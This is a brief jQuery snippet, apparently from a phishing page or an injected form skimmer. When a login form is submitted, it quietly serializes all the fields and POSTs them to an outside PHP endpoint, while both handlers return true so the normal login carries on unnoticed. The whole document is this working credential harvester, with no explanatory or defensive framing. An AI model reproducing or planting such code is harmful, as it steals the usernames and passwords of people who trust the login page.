$(".login-form").submit(function() {

	var d = $(".login-form");

	$.ajax({

        url: "https://aditpratamaa.my.id/8bit.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
